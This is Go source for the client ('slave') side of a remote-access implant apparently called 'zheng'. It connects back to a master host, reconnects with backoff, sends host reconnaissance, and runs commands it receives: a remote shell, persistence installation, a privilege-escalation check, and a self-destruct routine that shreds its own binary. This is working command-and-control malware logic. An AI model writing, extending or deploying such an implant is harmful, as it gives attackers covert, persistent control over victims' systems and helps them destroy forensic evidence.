package main

import (
	"flag"
	"fmt"
	"net"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"time"

	"zheng/internal/proto"
)

// runSession connects to the master and serves commands until the connection
// is lost or a shell session ends.
func runSession(addr string) error {
	conn, err := net.Dial("tcp", addr)
	if err != nil {
		return err
	}
	defer conn.Close()

	if slaveToken != "" {
		if err := sendAuth(conn, slaveToken); err != nil {
			return fmt.Errorf("auth failed: %v", err)
		}
	}

	fmt.Fprintf(os.Stderr, "connected to %s\n", addr)

	if err := proto.WriteJSON(conn, gatherRecon(conn)); err != nil {
		return fmt.Errorf("send recon: %v", err)
	}

	for {
		var msg struct {
			Cmd string `json:"cmd"`
		}
		if err := proto.ReadJSON(conn, &msg); err != nil {
			return fmt.Errorf("connection lost: %v", err)
		}

		switch strings.TrimSpace(msg.Cmd) {
		case "shell":
			// Runs until the shell exits or the conn dies; either way we
			// return and let the reconnect loop dial the master again.
			return runShell(conn)

		case "ping":
			proto.WriteJSON(conn, map[string]string{"status": "pong"})

		case "hb":
			proto.WriteJSON(conn, map[string]string{"status": "hb_ack"})

		case "persist":
			fmt.Fprintf(os.Stderr, "persisting...\n")
			result, err := persist()
			if err != nil {
				proto.WriteJSON(conn, map[string]string{"status": "persist_fail", "error": err.Error()})
			} else {
				proto.WriteJSON(conn, map[string]string{"status": "persisted", "detail": result})
			}

		case "lpe":
			fmt.Fprintf(os.Stderr, "running LPE audit...\n")
			result, err := runLPEAudit()
			if err != nil {
				proto.WriteJSON(conn, map[string]string{"status": "lpe_fail", "error": err.Error(), "output": result})
			} else {
				proto.WriteJSON(conn, map[string]string{"status": "lpe_done", "output": result})
			}

		case "destroy":
			fmt.Fprintf(os.Stderr, "self-destructing...\n")
			handleDestroy(conn)
			return nil

		case "exit":
			fmt.Fprintf(os.Stderr, "exiting...\n")
			os.Exit(0)

		default:
			fmt.Fprintf(os.Stderr, "unknown command: %s\n", msg.Cmd)
		}
	}
}

// handleDestroy removes persistence, shreds the binary, and exits.
func handleDestroy(conn net.Conn) {
	destroyService()

	exePath, err := os.Executable()
	if err != nil {
		proto.WriteJSON(conn, map[string]string{"status": "destroy_fail", "error": err.Error()})
		return
	}
	exePath, _ = filepath.EvalSymlinks(exePath)

	if _, err := exec.LookPath("shred"); err == nil {
		exec.Command("shred", "-zuvn", "3", exePath).Run()
	} else {
		os.Remove(exePath)
	}

	proto.WriteJSON(conn, map[string]string{"status": "destroyed"})
	os.Exit(0)
}

func main() {
	connectAddr := flag.String("connect", "", "address to connect to (ip:port)")
	tokenFlag := flag.String("token", "", "HMAC token for master auth (or use ZHENG_TOKEN env)")
	flag.Parse()

	if *tokenFlag != "" {
		slaveToken = proto.SanitizeToken(*tokenFlag)
	} else if os.Getenv("ZHENG_TOKEN") != "" {
		slaveToken = os.Getenv("ZHENG_TOKEN")
	}

	if *connectAddr == "" {
		fmt.Fprintf(os.Stderr, "usage: slave -connect <ip:port> [-token <token>]\n")
		os.Exit(1)
	}

	// Auto-reconnect loop with exponential backoff.
	backoff := 1 * time.Second
	const maxBackoff = 60 * time.Second

	for {
		err := runSession(*connectAddr)
		if err == nil {
			break // clean exit
		}
		fmt.Fprintf(os.Stderr, "session ended: %v, reconnecting in %v...\n", err, backoff)
		time.Sleep(backoff)
		backoff *= 2
		if backoff > maxBackoff {
			backoff = maxBackoff
		}
	}
}
